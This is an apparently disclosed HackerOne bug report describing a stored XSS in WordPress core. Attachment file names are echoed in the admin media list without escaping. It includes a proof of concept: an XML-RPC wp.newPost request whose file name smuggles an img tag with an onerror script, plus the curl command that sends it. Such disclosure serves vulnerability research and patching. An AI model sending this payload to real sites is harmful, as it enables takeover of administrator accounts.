# WordPress core stored XSS via attachment file name

## Report Details
- **Report ID**: 139245
- **URL**: https://hackerone.com/reports/139245
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-17T05:47:51.134Z
- **Disclosed**: 2016-08-05T22:07:08.621Z

## Reporter
- **Username**: jouko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
I think there's a problem with missing HTML encoding of attachment file names. A user with the capability to create attachments could compromise other accounts including administrator by injecting HTML tags in the file name.

Creating attachment with arbitrary filenames is possible at least via the XMLRPC wp.newPost() function.

With a quick search I found two places where the filename is not HTML-escaped. First, `wp-admin/includes/class-wp-media-list-table.php`:
~~~~ php
                <p class="filename">
                        <span class="screen-reader-text"><?php _e( 'File name:' ); ?> </span>
                        <?php
                        $file = get_attached_file( $post->ID );
                        echo wp_basename( $file );
                        ?>
                </p>
~~~~
The injected script is triggered when a user clicks the *Media* menu in the Dashboard.

The second is the attachment page found e.g. with the *attachment_id=xxx* query parameter. It might be theme-dependent. I checked Twenty Fourteen and Twenty Sixteen and both were vulnerable.

#PoC#
1. Create a file called `xss.xml`:
~~~~ xml
<?xml version="1.0"?>
<methodCall>
<methodName>wp.newPost</methodName>
<params>
        <param><value>empty</value></param>
        <param><value>username</value></param>
        <param><value>password</value></param>
        <param><struct>
                <member><name>post_title</name><value>aaa</value></member>
                <member><name>post_type</name><value>attachment</value></member>
                <member><name>post_content</name><value>bbb</value></member>
                <member><name>post_status</name><value>publish</value></member>
                <member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>
        </struct></param>       
</params>
</methodCall>
~~~~

2. Send the request with

~~~~ sh
curl 'https://wordpress.site/xmlrpc.php' --data-binary "`cat xss.xml`" -H 'Content-type: application/xml'
~~~~

3. Go to the Dashboard as an administrator and view the media list. An alert box should appear. Only the *list* mode seems to be vulnerable but apparently it's the default.


## Attachments
No attachments
